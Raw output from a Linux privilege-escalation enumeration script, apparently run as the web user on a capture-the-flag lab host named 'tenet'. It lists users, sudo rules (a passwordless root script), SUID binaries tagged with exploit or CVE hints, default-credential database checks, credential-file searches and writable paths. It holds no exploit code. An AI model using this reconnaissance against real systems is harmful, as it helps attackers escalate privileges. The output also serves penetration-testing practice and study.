tcp6       1      0 10.129.71.67:80         10.10.14.35:36542       CLOSE_WAIT  -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
udp        0      0 127.0.0.1:45568         127.0.0.53:53           ESTABLISHED -                   
udp        0      0 10.129.71.67:54922      1.1.1.1:53              ESTABLISHED -                   

[+] Can I sniff with tcpdump?
No


====================================( Users Information )=====================================
[+] My user
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#users
uid=33(www-data) gid=33(www-data) groups=33(www-data)

[+] Do I have PGP keys?
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

[+] Clipboard or highlighted text?
xsel and xclip Not Found

[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
Matching Defaults entries for www-data on tenet:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:

User www-data may run the following commands on tenet:
    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh

[+] Checking sudo tokens
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
/proc/sys/kernel/yama/ptrace_scope is not enabled (1)
gdb wasn't found in PATH

[+] Checking doas.conf
/etc/doas.conf Not Found

[+] Checking Pkexec policy
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2

[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

[+] Superusers
root:x:0:0:root:/root:/bin/bash

[+] Users with console
neil:x:1001:1001:neil,,,:/home/neil:/bin/bash
root:x:0:0:root:/root:/bin/bash

[+] All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=1001(neil) gid=1001(neil) groups=1001(neil)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
uid=103(messagebus) gid=107(messagebus) groups=107(messagebus)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=105(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=106(uuidd) gid=110(uuidd) groups=110(uuidd)
uid=107(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=108(landscape) gid=112(landscape) groups=112(landscape)
uid=109(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=111(mysql) gid=115(mysql) groups=115(mysql)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

[+] Login now
 19:07:55 up  5:29,  0 users,  load average: 0.12, 0.04, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

[+] Last logons
reboot   system boot  Tue Dec  8 10:28:51 2020 - Tue Dec  8 10:40:50 2020  (00:11)     0.0.0.0
shaun    pts/0        Tue Dec  8 10:20:24 2020 - Tue Dec  8 10:28:28 2020  (00:08)     10.10.14.3
reboot   system boot  Tue Dec  8 10:19:47 2020 - Tue Dec  8 10:28:32 2020  (00:08)     0.0.0.0
shaun    pts/0        Tue Dec  8 10:06:13 2020 - Tue Dec  8 10:19:25 2020  (00:13)     10.10.14.3
reboot   system boot  Tue Dec  8 10:04:31 2020 - Tue Dec  8 10:19:29 2020  (00:14)     0.0.0.0
shaun    pts/0        Tue Dec  8 09:26:30 2020 - Tue Dec  8 10:04:09 2020  (00:37)     10.10.14.3
shaun    tty1         Tue Dec  8 09:22:35 2020 - down                      (00:41)     0.0.0.0
reboot   system boot  Tue Dec  8 09:17:40 2020 - Tue Dec  8 10:04:11 2020  (00:46)     0.0.0.0

wtmp begins Tue Dec  8 09:17:40 2020

[+] Last time logon each user
Username         Port     From             Latest
root             tty1                      Thu Feb 11 14:37:46 +0000 2021
neil             pts/0    10.10.14.3       Thu Dec 17 10:59:51 +0000 2020

[+] Password policy
PASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_WARN_AGE	7
ENCRYPT_METHOD SHA512

[+] Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!


===================================( Software Information )===================================
[+] MySQL version
mysql  Ver 14.14 Distrib 5.7.32, for Linux (x86_64) using  EditLine wrapper

[+] MySQL connection using default root/root ........... No
[+] MySQL connection using root/toor ................... No
[+] MySQL connection using root/NOPASS ................. No
[+] Searching mysql credentials and exec
 Not Found

[+] PostgreSQL version and pgadmin credentials
 Not Found

[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No
[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No
[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No

[+] Apache server info
Version: Server version: Apache/2.4.29 (Ubuntu)
Server built:   2020-08-12T21:33:25
PHP exec extensions
/etc/apache2/mods-available/php7.2.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-available/php7.2.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php7.2.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php7.2.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-enabled/php7.2.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-enabled/php7.2.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php7.2.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php7.2.conf:    SetHandler application/x-httpd-php-source

[+] Searching PHPCookies
 Not Found

[+] Searching Wordpress wp-config.php files
wp-config.php Not Found

[+] Searching Drupal settings.php files
/default/settings.php Not Found

[+] Searching Tomcat users file
tomcat-users.xml Not Found

[+] Mongo information
mongo binary Not Found

[+] Searching supervisord configuration file
supervisord.conf Not Found

[+] Searching cesi configuration file
cesi.conf Not Found

[+] Searching Rsyncd config file
rsyncd.conf Not Found
[+] Searching Hostapd config file
hostapd.conf Not Found

[+] Searching wifi conns file
 Not Found

[+] Searching Anaconda-ks config files
anaconda-ks.cfg Not Found

[+] Searching .vnc directories and their passwd files
.vnc Not Found

[+] Searching ldap directories and their hashes
ldap Not Found

[+] Searching .ovpn files and credentials
.ovpn Not Found

[+] Searching ssl/ssh files
ChallengeResponseAuthentication no
UsePAM yes
 --> /etc/hosts.allow file found, read the rules:
/etc/hosts.allow


Searching inside /etc/ssh/ssh_config for interesting info
Host *
   PasswordAuthentication no
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes
    PubkeyAuthentication yes

[+] Searching unexpected auth lines in /etc/pam.d/sshd
No

[+] Searching Cloud credentials (AWS, Azure, GC)

[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
/etc/exports Not Found

[+] Searching kerberos conf files and tickets
[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt
krb5.conf Not Found
tickets kerberos Not Found
klist Not Found

[+] Searching Kibana yaml
kibana.yml Not Found

[+] Searching Knock configuration
Knock.config Not Found

[+] Searching logstash files
 Not Found

[+] Searching elasticsearch files
 Not Found

[+] Searching Vault-ssh files
vault-ssh-helper.hcl Not Found

[+] Searching AD cached hashes
cached hashes Not Found

[+] Searching screen sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
No Sockets found in /run/screen/S-www-data.

[+] Searching tmux sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
tmux Not Found

[+] Searching Couchdb directory

[+] Searching redis.conf

[+] Searching dovecot files
dovecot credentials Not Found

[+] Searching mosquitto.conf

[+] Searching neo4j auth file

[+] Searching Cloud-Init conf file

[+] Searching Erlang cookie file

[+] Searching GVM auth file

[+] Searching IPSEC files

[+] Searching IRSSI files

[+] Searching Keyring files

[+] Searching Filezilla sites file

[+] Searching backup-manager files

[+] Searching uncommon passwd files (splunk)

[+] Searching GitLab related files


[+] Searching PGP/GPG
PGP/GPG software:
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

[+] Searching vim files

[+] Checking if containerd(ctr) is available
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/containerd-ctr-privilege-escalation

[+] Checking if runc is available
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation

[+] Searching docker files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket

[+] Interesting Firefox Files
[i] https://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox

[+] Interesting Chrome Files
[i] https://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox


====================================( Interesting Files )=====================================
[+] SUID - Check easy privesc, exploits and write perms
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
strings Not Found
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/4917/bin/ping6
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/4917/bin/ping
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/10444/bin/ping6
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/10444/bin/ping
-rwsr-xr-- 1 root   dip             382K Jan 29  2016 /snap/core/4917/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root   root             31K Aug 11  2016 /bin/fusermount
-rwsr-xr-- 1 root   systemd-resolve  42K Jan 12  2017 /snap/core/4917/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root             10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root   root             53K May 17  2017 /snap/core/4917/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root   root             74K May 17  2017 /snap/core/4917/usr/bin/gpasswd
-rwsr-xr-x 1 root   root             40K May 17  2017 /snap/core/4917/usr/bin/chsh
-rwsr-xr-x 1 root   root             71K May 17  2017 /snap/core/4917/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root   root             39K May 17  2017 /snap/core/4917/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root   root             40K May 17  2017 /snap/core/4917/bin/su
-rwsr-xr-x 1 root   root            134K Jul  4  2017 /snap/core/4917/usr/bin/sudo  --->  /sudo$
-rwsr-xr-x 1 root   root             27K Nov 30  2017 /snap/core/4917/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root   root             40K Nov 30  2017 /snap/core/4917/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root   root            419K Jan 18  2018 /snap/core/4917/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 daemon daemon           51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-sr-x 1 root   root             97K Jun 21  2018 /snap/core/4917/usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root   root             99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root   root            427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root             59K Mar 22  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root   root             37K Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root   root             40K Mar 22  2019 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root   root             37K Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root   root             75K Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root   root             44K Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root   root             75K Mar 22  2019 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root   root             44K Mar 22  2019 /bin/su
-rwsr-xr-x 1 root   root             53K Mar 25  2019 /snap/core/10444/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root   root             74K Mar 25  2019 /snap/core/10444/usr/bin/gpasswd
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/10444/usr/bin/chsh
-rwsr-xr-x 1 root   root             71K Mar 25  2019 /snap/core/10444/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root   root             39K Mar 25  2019 /snap/core/10444/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/10444/bin/su
-rwsr-xr-x 1 root   root             14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root   root             22K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-x 1 root   root             19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root   root             63K Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root   root             27K Jan 27  2020 /snap/core/10444/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root   root             40K Jan 27  2020 /snap/core/10444/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root   root            134K Jan 31  2020 /snap/core/10444/usr/bin/sudo  --->  /sudo$
-rwsr-xr-x 1 root   root            419K May 26  2020 /snap/core/10444/usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root   messagebus       42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-- 1 root   systemd-resolve  42K Jun 11  2020 /snap/core/10444/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-- 1 root   dip             386K Jul 23  2020 /snap/core/10444/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root   root             27K Sep 16 18:43 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root   root             43K Sep 16 18:43 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root   root            111K Nov 19 16:51 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root   root            109K Nov 19 17:07 /snap/core/10444/usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root   root            146K Jan 19 14:36 /usr/bin/sudo  --->  /sudo$

[+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
-rwxr-sr-x 3 root   mail             15K Dec  3  2012 /snap/core/4917/usr/bin/mail-unlock
-rwxr-sr-x 3 root   mail             15K Dec  3  2012 /snap/core/4917/usr/bin/mail-touchlock
-rwxr-sr-x 3 root   mail             15K Dec  3  2012 /snap/core/4917/usr/bin/mail-lock
-rwxr-sr-x 3 root   mail             15K Dec  3  2012 /snap/core/10444/usr/bin/mail-unlock
-rwxr-sr-x 3 root   mail             15K Dec  3  2012 /snap/core/10444/usr/bin/mail-touchlock
-rwxr-sr-x 3 root   mail             15K Dec  3  2012 /snap/core/10444/usr/bin/mail-lock
-rwxr-sr-x 1 root   mail             15K Dec  7  2013 /snap/core/4917/usr/bin/dotlockfile
-rwxr-sr-x 1 root   mail             15K Dec  7  2013 /snap/core/10444/usr/bin/dotlockfile
-rwxr-sr-x 1 root   utmp             10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwxr-sr-x 1 root   systemd-network  36K Apr  5  2016 /snap/core/4917/usr/bin/crontab
-rwxr-sr-x 1 root   systemd-network  36K Apr  5  2016 /snap/core/10444/usr/bin/crontab
-rwxr-sr-x 1 root   shadow           23K May 17  2017 /snap/core/4917/usr/bin/expiry
-rwxr-sr-x 1 root   shadow           61K May 17  2017 /snap/core/4917/usr/bin/chage
-rwxr-sr-x 1 root   crontab          39K Nov 16  2017 /usr/bin/crontab
-rwxr-sr-x 1 root   tty              27K Nov 30  2017 /snap/core/4917/usr/bin/wall
-rwxr-sr-x 1 root   tty              14K Jan 17  2018 /usr/bin/bsd-write
-rwxr-sr-x 1 root   crontab         351K Jan 18  2018 /snap/core/4917/usr/bin/ssh-agent
-rwsr-sr-x 1 daemon daemon           51K Feb 20  2018 /usr/bin/at
-rwxr-sr-x 1 root   mlocate          43K Mar  1  2018 /usr/bin/mlocate
-rwxr-sr-x 1 root   shadow           35K Apr  9  2018 /snap/core/4917/sbin/unix_chkpwd
-rwxr-sr-x 1 root   shadow           35K Apr  9  2018 /snap/core/4917/sbin/pam_extrausers_chkpwd
-rwsr-sr-x 1 root   root             97K Jun 21  2018 /snap/core/4917/usr/lib/snapd/snap-confine
-rwxr-sr-x 1 root   ssh             355K Mar  4  2019 /usr/bin/ssh-agent
-rwxr-sr-x 1 root   shadow           23K Mar 22  2019 /usr/bin/expiry
-rwxr-sr-x 1 root   shadow           71K Mar 22  2019 /usr/bin/chage
-rwxr-sr-x 1 root   shadow           23K Mar 25  2019 /snap/core/10444/usr/bin/expiry
-rwxr-sr-x 1 root   shadow           61K Mar 25  2019 /snap/core/10444/usr/bin/chage
-rwxr-sr-x 1 root   tty              27K Jan 27  2020 /snap/core/10444/usr/bin/wall
-rwxr-sr-x 1 root   crontab         351K May 26  2020 /snap/core/10444/usr/bin/ssh-agent
-rwxr-sr-x 1 root   shadow           34K Jul 21  2020 /sbin/unix_chkpwd
-rwxr-sr-x 1 root   shadow           34K Jul 21  2020 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root   tty              31K Sep 16 18:43 /usr/bin/wall
-rwxr-sr-x 1 root   shadow           35K Oct  1 00:36 /snap/core/10444/sbin/unix_chkpwd
-rwxr-sr-x 1 root   shadow           35K Oct  1 00:36 /snap/core/10444/sbin/pam_extrausers_chkpwd

[+] Checking misconfigurations of ld.so
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so
/etc/ld.so.conf
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
/usr/local/lib/x86_64-linux-gnu
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
Current capabilities:
Current: =
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000

Shell capabilities:
0x0000000000000000=
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000

Files with capabilities:
/usr/bin/mtr-packet = cap_net_raw+ep

[+] Users with capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities

[+] Files with ACLs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls
files with acls in searched folders Not Found

[+] .sh files in path
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path
/usr/local/bin/enableSSH.sh
/usr/bin/gettext.sh

[+] Unexpected in root
/vmlinuz
/initrd.img
/vmlinuz.old
/initrd.img.old
/lost+found

[+] Files (scripts) in /etc/profile.d/
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files
total 36
drwxr-xr-x  2 root root 4096 Jan  7 09:58 .
drwxr-xr-x 97 root root 4096 Feb 11 14:39 ..
-rw-r--r--  1 root root   96 Aug 13  2020 01-locale-fix.sh
-rw-r--r--  1 root root 1557 Dec  4  2017 Z97-byobu.sh
-rwxr-xr-x  1 root root 3417 Aug 27 22:42 Z99-cloud-locale-test.sh
-rwxr-xr-x  1 root root  873 Aug 27 22:42 Z99-cloudinit-warnings.sh
-rw-r--r--  1 root root  833 Nov 19 16:51 apps-bin-path.sh
-rw-r--r--  1 root root  664 Apr  2  2018 bash_completion.sh
-rw-r--r--  1 root root 1003 Dec 29  2015 cedilla-portuguese.sh

[+] Permissions in init, init.d, systemd, and rc.d
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d

[+] Hashes inside passwd file? ........... No
[+] Writable passwd file? ................ No
[+] Credentials in fstab/mtab? ........... No
[+] Can I read shadow files? ............. No
[+] Can I read opasswd file? ............. No
[+] Can I write in network-scripts? ...... No
[+] Can I read root folder? .............. No

[+] Searching root files in home dirs (limit 30)
/home/
/root/

[+] Searching folders owned by me containing others files on it

[+] Readable files belonging to root and readable by me but not world readable

[+] Modified interesting files in the last 5mins (limit 100)
/var/log/auth.log
/var/log/syslog
/var/log/journal/fe4c9faf9c1541a39593b82dc7145d9b/system.journal
/var/log/kern.log

[+] Writable log files (logrotten) (limit 100)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation

[+] Files inside /home/www-data (limit 20)

[+] Files inside others home (limit 20)
/home/neil/.bash_logout
/home/neil/.profile
/home/neil/.bashrc
/home/neil/user.txt

[+] Searching installed mail applications

[+] Mails (limit 50)

[+] Backup folders

[+] Backup files
-rw-r--r-- 1 root root 35544 Mar 25  2020 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 0 Dec 10 11:54 /usr/src/linux-headers-4.15.0-129-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 0 Dec 10 11:54 /usr/src/linux-headers-4.15.0-129-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 217469 Dec 10 11:54 /usr/src/linux-headers-4.15.0-129-generic/.config.old
-rw-r--r-- 1 root root 0 Nov 23 18:01 /usr/src/linux-headers-4.15.0-126-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 0 Nov 23 18:01 /usr/src/linux-headers-4.15.0-126-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 217469 Nov 23 18:01 /usr/src/linux-headers-4.15.0-126-generic/.config.old
-rw-r--r-- 1 root root 11755 Dec  8 09:37 /usr/share/info/dir.old
-rwxr-xr-x 1 root root 226 Dec  4  2017 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 root root 2746 Jan 23  2020 /usr/share/man/man8/vgcfgbackup.8.gz
-rw-r--r-- 1 root root 361345 Feb  2  2018 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 7867 Nov  7  2016 /usr/share/doc/telnet/README.telnet.old.gz
-rw-r--r-- 1 root root 1758 Mar 24  2020 /usr/share/sosreport/sos/plugins/ovirt_engine_backup.py
-rw-r--r-- 1 root root 1397 Dec  8 09:36 /usr/share/sosreport/sos/plugins/__pycache__/ovirt_engine_backup.cpython-36.pyc
-rw-r--r-- 1 root root 7905 Nov 23 18:01 /lib/modules/4.15.0-126-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 7857 Nov 23 18:01 /lib/modules/4.15.0-126-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 7905 Dec 10 11:54 /lib/modules/4.15.0-129-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 7857 Dec 10 11:54 /lib/modules/4.15.0-129-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 168 Jul 25  2018 /etc/apt/sources.list.curtin.old
-rwxr-xr-x 1 www-data www-data 514 Dec 17 09:52 /var/www/html/sator.php.bak
-rw-r--r-- 1 root root 342 Feb 17 13:39 /run/blkid/blkid.tab.old

[+] Searching tables inside readable .db/.sql/.sqlite files (limit 100)

[+] Web files?(output limit)
/var/www/:
total 12K
drwxr-xr-x  3 root     root     4.0K Dec 16 11:26 .
drwxr-xr-x 14 root     root     4.0K Dec 16 11:19 ..
drwxr-xr-x  3 www-data www-data 4.0K Feb 17 19:00 html

/var/www/html:
total 360K
drwxr-xr-x 3 www-data www-data 4.0K Feb 17 19:00 .
drwxr-xr-x 3 root     root     4.0K Dec 16 11:26 ..

[+] Readable *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .gitconfig, .git-credentials, .git, .svn, .rhosts, hosts.equiv
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data

[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)

[+] Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)

[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
/dev/mqueue
/dev/shm
/run/lock
/run/lock/apache2
/run/screen
/run/screen/S-www-data
/snap/core/10444/run/lock
/snap/core/10444/tmp
/snap/core/10444/var/tmp
/snap/core/4917/run/lock
/snap/core/4917/tmp
/snap/core/4917/var/tmp
/tmp
/tmp/tmux-33
/var/cache/apache2/mod_cache_disk
/var/crash
/var/lib/lxcfs/cgroup/memory/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/acpid.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cloud-config.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cloud-final.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cloud-init.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-sda3.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ifup@ens160.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/irqbalance.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxd.socket/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/mysql.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/networkd-dispatcher.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/open-vm-tools.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/polkit.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snap-core-10444.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snap-core-4917.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.socket/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-config.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-networkd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-resolved.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
